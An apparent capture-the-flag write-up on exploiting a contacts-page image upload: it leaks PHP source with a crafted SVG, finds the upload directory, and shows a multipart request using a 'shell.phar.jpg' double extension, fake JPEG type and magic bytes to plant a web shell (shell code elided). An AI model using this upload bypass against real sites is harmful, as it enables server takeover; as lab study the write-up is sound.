First we find which page might be vuln to file upload attacks. It is the contacts page having an img upload.
1. First we get the source code by uploading a naughty svg. It returns the base64 encoded index.php
   ![[Pasted image 20260118212417.png]]
   There is no clear indication where we can find the uploaded files, we search the source and find 2 things
   ```php
   
// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// results in <YYMMDD>_filename.ext filename
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;


```
From the code we know the stored files are at /contacts/user_feedback_submissions/<filename>
Finally its time to get a shell and extract the flag from root.
We change the Content header to point to jpg and fuzz the available extensions.
```
Content-Disposition: form-data; name="uploadFile"; filename="shell.phar.jpg"
  
Content-Type: image/jpeg  
  
ÿØÿî // file descriptor jpg, another good one is GIF8
<php. .... > //  shell code
```
from this we get a shell at /contacts/user_feedback_submissions/shell.phar.jpg  and find root :)
